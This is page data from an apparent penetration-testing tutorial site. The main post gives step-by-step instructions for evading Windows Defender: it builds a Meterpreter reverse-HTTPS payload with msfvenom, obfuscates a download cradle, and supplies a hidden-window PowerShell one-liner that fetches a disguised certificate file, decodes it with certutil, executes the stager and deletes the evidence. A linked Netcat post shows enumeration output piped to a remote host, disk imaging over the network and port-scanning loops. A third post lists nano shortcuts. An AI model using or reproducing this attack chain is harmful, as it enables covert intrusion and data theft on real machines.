{"componentChunkName":"component---src-templates-blog-post-js","path":"/tutorials/power-shell-in-memory-injection-using-cert-util-exe/","result":{"pageContext":{"post":{"fields":{"slug":"/power-shell-in-memory-injection-using-cert-util-exe"},"excerpt":null,"frontmatter":{"date":"18th May 2022 ","title":"PowerShell: In-Memory Injection Using CertUtil.exe","description":"Using PowerShell, `Invoke-CradleCrafter` and Microsoft’s Certutil.exe to craft a payload and one-liner that can be used to evade the latest version of Windows Defender (as of this writing).","tags":"certutil, powershell","posttype":"tutorial"},"body":"- PowerShell is still one of the easiest and best ways to gain a foothold, but at the same time, it is selling you out because it talks to AMSI as soon as it’s run.\n- The beauty of this method is that Microsoft’s `certutil` does the network call out to your primary payload while appearing to be an innocent certificate file.\n\n**Pre-Requisites**\n\n- Download `Invoke-CradleCrafter` from GitHub.\n\n**Methodology**\n\n1. First, we will create a base64 encoded PowerShell Meterpreter payload by performing the following:\n\n```\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=<YOUR IP HERE> LPORT=443 -e cmd/powershell_base64 -f psh -o b64_pwsh.txt\n```\n\n<div class=\"card-body es-lightbulb\"><p>\n**Note** that the payload file’s extension could be anything as long as `certutil` can get at it and read its content. For example, an organization may have a policy (or IDS, content filter, etc.) that does not allow the downloading of scripts; however, they probably allow .txt files or even files with abnormal extensions. If you change it, make sure you compensate for that when setting the URL in `Invoke-CradleCrafter`</p>\n</div>\n\n\n1. Next, you will create a folder used to serve up web content. Place the PowerShell Meterpreter PowerShell script (`b64_pwsh.txt`) inside this folder.\n2. Next, we will use `Invoke-CradleCrafter` to obfuscate our `certutil` and PowerShell commands used to perform the in-memory injection. Drop into a PowerShell prompt on your Linux host by typing `pwsh` or `powershell`.  Then `cd` into your `Invoke-CradleCrafter` directory.\n\n```powershell\nImport-Module .\\Invoke-CradleCrafter.psd1; \nInvoke-CradleCrafter\nInvoke-CradleCrafter> SET URL http://10.10.10.10/b64_pwsh.txt\nInvoke-CradleCrafter> MEMORY\nInvoke-CradleCrafter> CERTUTIL\n```\n\n1. Next, you will be presented with your obfuscation options. Select **ALL** by typing it on the command line and then typing **1** to execute.\n\n```\n:::powershell\nInvoke-CradleCrafter> ALL\nInvoke-CradleCrafter> 1\n```\n\n1. Once generated, we now have a PowerShell cradle with obfuscation that can pull in our `b64_pwsh.txt` payload. We now want to put this into a text file such as `output.txt` for encoding. \n2. We will encode this file in base64 using the `certutil` to create a file called `cert.cer` which will end up on our web server next to the `b64_pwsh.txt`.\n\n```\ncertutil -encode output.txt cert.cet\n```\n\n1. We can now use the following one-liner to pull our `cert.cer` certificate from our web server; the certificate gets decoded and saved to the disk as `stager.ps1`. The file `stager.ps1` is then executed (this is the content of the cradle we made earlier with `Invoke-CradleCrafter`), and when it runs, it pulls the `b64_pwsh.txt` file down from the server and executes it to give us a Metasploit Meterpreter session.  \n\n```\n:::powershell\npowershell.exe -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\\cert.cer (New-Object Net.WebClient).DownloadString('http://10.10.10.10/cert.cer'); certutil -decode %APPDATA%\\cert.cer %APPDATA%\\stager.ps1 & start /b cmd /c powershell.exe -Exec Bypass -NoExit -File %APPDATA%\\stager.ps1 & start /b cmd /c del %APPDATA%\\cert.cer\n```\n\n<div class=\"card-body es-warning\"><p> **NOTE** that the `cert.cer` file will be deleted by the script; however, you will need to remove the `stager.ps1` file manually.</p>\n</div>"},"prev":{"fields":{"slug":"/netcat"},"excerpt":"First some brief points about Netcat All official versions are free of chargeWorks natively on Linux.Works natively on Apple Mac OS X.W…","frontmatter":{"date":"8th June 2022 ","title":"Netcat","description":"This article looks at Netcat, a valuable tool in the pentesters toolbox. Hobbit released the original Netcat in 1995, but it hasn’t been maintained despite its popularity. It can sometimes be hard to find a copy of the v1.10 source code. The flexibility and usefulness of this tool prompted the Nmap Project to produce Ncat, a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.","tags":"netcat","posttype":"tutorial"},"body":"\n# Netcat\n\nFirst some brief points about Netcat\n- All official versions are free of charge\n- Works natively on Linux.\n- Works natively on Apple Mac OS X.\n- Works natively on Microsoft Windows.\n- Features a command-line interface.\n- Source code available for inspection.\n- General-purpose tools\n- Packet crafting tools\n\nThe `ncat` tool is a much better option in place of netcat or nc. \n\nWe think `ncat` is better because of its support for multiple protocols and simultaneous connections and SSL.\n\n\n## Overview\n\nThis simple utility reads and writes data across TCP or UDP network connections. It is designed to be a reliable back-end tool to use directly or easily drive by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need, including port binding to accept incoming connections.\n\n> Netcat can operate in environments where you have low privileges, plus it is a standalone binary, meaning you can upload it to an environment and run it as is.\n> Be warned that file transfers using Netcat are not encrypted, anyone on the network can grab what you are sending, so use this only on trusted networks.\n\n## Standard Listen and Send\n\nsetup netcat in listening mode and save whatever is received to `in.txt`\n```\nroot@box:/tmp/netcat# nc -w 1 -l -p 3000 > in.txt\n```\n\nFrom the sending end, we can pipe in a file called `out.txt` and send it to our listener.\n```\nnc -w 3 [destination] 3000 < out.txt\n```\n\n## Piping input\n\nWe can send data by sending output through a pipe to Netcat. Here we are outputting a file, but it could be several items.\n```\nC:\\Documents and Settings\\user> type c:\\test.txt | c:\\nc.exe 192.168.2.8 3000 -w1\n```\n\nOn our kali box, we can set a while loop like follows.\n```\nroot@evilsaint:/pentesting/enum# while true; do nc -w 4 -lvp 4321 >> enum.txt; done\n```\n\nAnd we can pipe enumeration commands back to our box.\n```\nC:\\Users\\labuser.ACME\\Desktop\\netcat-win32-1.12>ipconfig | nc64.exe 10.1.1.5 4321 -w 3\nC:\\Users\\labuser.ACME\\Desktop\\netcat-win32-1.12>net user | nc64.exe 10.1.1.5 4321 -w 3\nC:\\Users\\labuser.ACME\\Desktop\\netcat-win32-1.12>net account | nc64.exe 10.1.1.5 4321 -w 3\n```\n\n## Send with Compression (Linux to Linux)\n\nOn the receiving end\n```\nnc -l -p 1234 | uncompress -c | tar xvfp -\n```\n\nOn the sending end\n```\ntar cfp - /some/dir | compress -c | nc -w 3 [destination] 1234\n```\n\n## Sending a harddrive\n\nIt is possible using Netcat to pipe a hardrive\n\nOn the sender end run\n```\ndd if=/dev/hda3 | gzip -9 | nc -l 3333\n```\n\nOn the receiver end,\n```\nnc [destination] 3333 | pv -b > hd-image.img.gz\n```\n\n### Port Scanning with Netcat\n\nTCP scan of ports 3385 to 3395\n```\nnc -nvv -w 1 -z 10.0.0.1 3385-3395\n```\n\nUDP scan of ports 3385 to 3395\n```\nnc -unvv -w 1 -z 10.0.0.1 3385-3395\n```\n\nSmall Bash Loop to loop through all the ports from 1 to 65535 for one IP\n```\nfor i in $(seq 1 65535); do nc -nv -w 1 -z 10.0.0.1 $i ; done\n```\n\nSmall Bash Loop to loop through all the IPs on our subnet and scan for ports 21-25\n```\nfor i in {1..254}; do nc -vv -n -w 1 10.0.0.$i 21-25 -z; done\n```\n\n| Option | Description |\n| --- | --- |\n| -n | don't resolve first just use the IP address and don't try and use DNS to get a hostname |\n| -vv | single -v is verbose, double v -vv is extra verbosity. |\n| -u | UDP mode. |\n| -w | equals the timeout in seconds for net reads |\n| -z | Zero I/O mode used for scanning. |\n\n### Makeshift Permanent Netcat Listener\n\n`nohup` is a program you can use to run your application with such that its stdout/stderr can be sent to a file instead and such that closing the parent script won’t SIGHUP the child. However, you need to have the foresight to use it before starting the application. Because of how `nohup` works, you can’t just apply it to a running process.\n\n`disown` is a bash builtin that removes a shell job from the shell’s job list. This means that you can’t use `fg`, `bg` on it anymore, but more importantly, when you close your shell, it won’t hang or send a SIGHUP to that child anymore. Unlike `nohup`, disown is used after the process has been launched and backgrounded.\n\nMake a Netcat listener persistent.\n```\nwhile(1) nohup netcat -lvp 4444\n```"},"next":{"fields":{"slug":"/linux-nano-shortcuts"},"excerpt":"Files Read file\n\nCtrl-R\n\n\nSave file\n\nCtrl-O\n\n\nClose file\n\nCtrl-X\n\nCut and Paste\n\nStart marking text\n\nALT-A\n\n\nCut marked text or line.\n\nCTRL-K\n\n\nPaste…","frontmatter":{"date":"2nd May 2022 ","title":"Linux: Nano Shortcuts","description":"GNU nano is an easy to use command line text editor for Unix and Linux operating systems. It includes all the basic functionality you would want in a text editor. It offers syntax highlighting, multiple buffer spaces, search and replace with regular expression support, spellchecking, UTF-8 encoding, and more. While it doesn't have the same keybinding library as that of `vi` it does have a number of time-saving shortcuts that if you learn can significantly speed up your workflow.","tags":"linux, nano","posttype":"tutorial"},"body":"# Nano\n\n\n\n## Files\n\nRead file\n\n```\nCtrl-R\n```\n\nSave file\n\n```\nCtrl-O\n```\n\nClose file\n\n```\nCtrl-X\n```\n\n## Cut and Paste\n\nStart marking text\n\n```\nALT-A\n```\n\nCut marked text or line.\n\n```\nCTRL-K\n```\n\nPaste text\n\n```\nCTRL-U\n```\n\n## Navigate File\n\nEnd of file\n\n```\nALT-/\n```\n\nBeginning of line\n\n```\nCTRL-A\n```\n\nEnd of line\n\n```\nCTRL-E\n```\n\nShow line number\n\n```\nCTRL-C\n```\n\nGo to line number\n\n```\nCTRL-_\n```\n\n### Search File\n\nFind\n\n```\nCTRL-W\n```\n\nFind next\n\n```\nALT-W\n```\n\nSearch and replace\n\n```\nCTRL-\\\n```\n\nMore nano info at: [http://www.nano-editor.org/docs.php](http://www.nano-editor.org/docs.php)"}}},"staticQueryHashes":["310218920"],"slicesMap":{}}